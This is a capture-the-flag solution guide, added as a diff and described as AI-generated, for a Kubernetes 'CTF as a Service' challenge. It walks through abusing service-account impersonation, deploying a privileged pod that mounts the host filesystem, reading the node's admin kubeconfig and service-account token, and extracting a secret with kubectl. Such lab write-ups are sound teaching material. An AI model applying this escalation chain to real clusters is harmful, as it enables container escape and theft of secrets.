@@ -1,0 +1,150 @@
+CTFaaS Challenge Solution Guide
+===============================
+This is AI generated but should have the gist of the solution - burturt
+Overview
+--------
+The challenge involves a "CTF as a Service" platform where users can deploy Docker containers to a Kubernetes (K3s) cluster. The goal is to retrieve a flag stored in a Kubernetes Secret (`real-flag` in `hidden-vault` namespace).
+
+Vulnerability Analysis
+----------------------
+1.  **Service Account Permissions**: The deployed container runs with the `ctf-app` ServiceAccount.
+2.  **Impersonation**: `ctf-app` has the permission to **impersonate** the `ctf-deployer-sa` ServiceAccount (found in `chall-manifest.yaml`).
+3.  **Privilege Escalation**: `ctf-deployer-sa` has permissions to `create` Deployments and Services in the `default` namespace.
+4.  **Host Access**: Although `ctf-deployer-sa` cannot read Secrets directly, it can create a Deployment with a `hostPath` volume.
+5.  **Flag Location**: The flag is in a Secret, which is stored in the K3s SQLite database on the host node (`/var/lib/rancher/k3s/server/db/state.db`).
+
+Attack Plan
+-----------
+
+### Step 1: Prepare the Webshell
+We need a container that allows us to run `kubectl` commands. The provided `webshell/` directory contains a suitable app.
+
+1.  Navigate to the `webshell/` directory.
+2.  Build the Docker image:
+    ```bash
+    docker build -t webshell .
+    ```
+3.  Save the image to a tarball (required format for the challenge):
+    ```bash
+    docker save -o webshell.tar webshell
+    ```
+
+### Step 2: Deploy the Webshell
+1.  Access the CTFaaS Dashboard (using your team token).
+2.  Click "Create Instance" to spawn your VM.
+3.  Navigate to the provided Instance URL (e.g., `http://<IP>:30000`).
+4.  Upload `webshell.tar` and specify a port (default 80 is fine).
+5.  Once deployed, click the link to access your webshell.
+
+### Step 3: Exploit from Within the Webshell
+
+You are now executing commands inside the cluster as `ctf-app`.
+
+**0. Setup Environment:**
+The webshell's `kubectl` might not auto-discover the in-cluster configuration correctly for impersonation commands. These commands are added to the start of every web shell command for this solve for convenience:
+```bash
+#!/bin/bash -i
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+export CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+alias k="kubectl --server=https://kubernetes.default.svc --certificate-authority=$CA_CERT --token=$TOKEN"
+
+```
+*Note: Use `k` for all subsequent commands instead of kubectl.*
+
+**1. Discovery & Reconnaissance:**
+The challenge description mentions that the deployer uses "state-of-the-art security measures, including proper RBAC configurations" and "service accounts... with limited permissions". This is a hint to check our permissions.
+
+First, check what the current user (`ctf-app`) can do:
+```bash
+k auth can-i --list
+```
+*Output should show:* `impersonate` on `serviceaccounts` (specifically `ctf-deployer-sa`).
+
+This reveals we can impersonate another service account named `ctf-deployer-sa`. Now, let's check what *that* account can do:
+```bash
+k auth can-i --list --as=system:serviceaccount:default:ctf-deployer-sa
+```
+*Output should show:* `create` on `deployments`, `services`, etc.
+
+**2. Find your image tag:**
+We need to know the full image path of our webshell to reuse it for the exploit pod. You can see this image tag on the deployer itself after deploying.
+
+**3. Create the Exploit Manifest:**
+Create a file named `pwn.yaml` on your local machine. Replace `YOUR_IMAGE_TAG_HERE` with the tag found above.
+
+This manifest deploys a **privileged** container (our webshell image) that mounts the host's filesystem. By setting the `KUBECONFIG` environment variable to the host's K3s configuration file (`/mnt/host/etc/rancher/k3s/k3s.yaml`), our webshell gains **cluster-admin** privileges.
+
+```yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: pwn-shell
+  namespace: default
+  labels:
+    app: pwn-shell
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: pwn-shell
+  template:
+    metadata:
+      labels:
+        app: pwn-shell
+    spec:
+      containers:
+      - name: webshell
+        image: YOUR_IMAGE_TAG_HERE
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - name: host-root
+          mountPath: /mnt/host
+        env:
+        - name: KUBECONFIG
+          value: /mnt/host/etc/rancher/k3s/k3s.yaml
+      volumes:
+      - name: host-root
+        hostPath:
+          path: /
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: pwn-shell-svc
+  namespace: default
+spec:
+  selector:
+    app: pwn-shell
+  type: NodePort
+  ports:
+    - port: 80
+      targetPort: 80
+      nodePort: 31337
+```
+
+Use the **Upload File** feature in the initial webshell to upload `pwn.yaml` to `/tmp`.
+
+**4. Apply the Exploit:**
+Use impersonation to apply the manifest from its location in `/tmp`:
+```bash
+k apply -f /tmp/pwn.yaml --as=system:serviceaccount:default:ctf-deployer-sa
+```
+
+**5. Access Privileged Webshell:**
+Wait a few seconds for the new pod to start.
+Navigate to `http://<VM_IP>:31337` in your browser. You are now in a webshell running as root with full access to the host's K3s configuration.
+
+**6. Retrieve the Flag:**
+Since this shell is using the admin kubeconfig, RBAC restrictions no longer apply.
+Run the following commands in the privileged webshell:
+
+List the secrets in the hidden namespace:
+```bash
+kubectl get secrets -n hidden-vault
+```
+
+Extract and decode the flag:
+```bash
+kubectl get secret real-flag -n hidden-vault -o jsonpath="{.data.flag}" | base64 -d
+```
